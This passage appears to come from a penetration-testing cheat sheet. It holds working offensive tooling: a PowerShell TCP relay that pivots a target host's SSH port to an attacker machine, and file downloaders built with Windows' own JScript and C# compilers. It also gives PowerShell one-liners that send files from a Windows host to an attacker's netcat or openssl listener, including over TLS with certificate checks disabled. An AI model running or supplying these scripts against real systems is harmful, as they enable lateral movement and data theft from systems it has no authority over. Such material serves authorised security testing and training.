            sys.exit()
       if(sock == a_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            t_conn.send(data)
         else:
            sys.exit()
   if(t == 0):
      sleep(0.01)
```

Powershell script `tcprelay.ps1`<br />
```powershell
# Target parameters
$tcpTHost = "192.168.100.109"
$tcpTPort = "22"

# Attacker parameters
$tcpAHost = "192.168.1.19"
$tcpAPort = "4444"

try {
   $tcpAClient = New-Object System.Net.Sockets.TcpClient($tcpAHost, $tcpAPort)
}
catch {
   Write-Output "Failed to connect to attacking host"
   exit
}

try {
   $tcpTClient = New-Object System.Net.Sockets.TcpClient($tcpTHost, $tcpTPort)
}
catch {
   Write-Output "Failed to connect to target host"
   exit
}

$TStream = $tcpTClient.GetStream()
$AStream = $tcpAClient.GetStream()

$TBuffer = New-Object Byte[] $tcpTClient.ReceiveBufferSize
$ABuffer = New-Object Byte[] $tcpAClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpTClient.Connected -and $tcpAClient.Connected)
   {
      if(($tcpTClient.Client.Available -gt 0) -or ($tcpAClient.Client.Available -gt 0))
      {
         if($tcpTClient.Client.Available -gt 0)
         {
            $TRead = $TStream.Read($TBuffer, 0, $TBuffer.Length)
            $AStream.Write($TBuffer, 0, $TRead)
            $idle = 0
         }
         if($tcpAClient.Client.Available -gt 0)
         {
            $ARead = $AStream.Read($ABuffer, 0, $ABuffer.Length)
            $TStream.Write($ABuffer, 0, $ARead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpTClient.Close()
            $tcpAClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

Start `apprelay.py` on the attacking machine.

Execute `powershell -File tcprelay.ps1` on the Windows host.

When `apprelay.py` indicates that you can start your local application execute `ssh user@localhost -p 2222`.

## >> Downloading files with compiled Javascript

First, as administrator, register the System .NET assembly.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe System.dll`

As ordinary user, perform the following steps.  Create a javascript file, dl.js.

```javascript
var strURL = "http://download.domain.com/file.bin";
var strFilePath = "C:\\folder\\file.bin";
var oWebClient = new ActiveXObject("System.Net.WebClient");
oWebClient.DownloadFile(strURL, strFilePath);
```

Compile dl.js into an exe.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe dl.js`

Now execute `dl.exe` to retrieve the file.

## >> Downloading files with compiled C#

Create csharp file, dl.cs.

```
using System.Net;

namespace dlfile
{
   class dl
   {
      static void Main()
      {
         string URL = "http://download.domain.com/file.bin";
         string FilePath = "C:\\folder\\file.bin";
         WebClient WC = new WebClient();
         WC.DownloadFile(URL, FilePath);
      }
   }
}
```

Compile the program.

`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:c:\folder\dl.exe c:\folder\dl.cs`

Execute `dl.exe` to retrieve the file.

## >> Uploading a file via powershell

Start netcat listener on Linux (10.192.103.49).<br />
`nc -nlvp 4444 | fold -w 76 | base64 -d > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 4444);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$socket.close();
```

**Send file over a TLS socket**

Start openssl server on Linux (10.192.103.49).<br />
Generate a certificate and key first.<br />
`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`

`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 | fold -w 76 | base64 -di > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 443);
$stream = $socket.GetStream();
$callback = { param($sender, $cert, $chain, $errors) return $true };
$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
$sslstream.AuthenticateAsClient("whatever");
$stream = $sslstream;
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$writer.close();
$stream.close();
$socket.close();
```
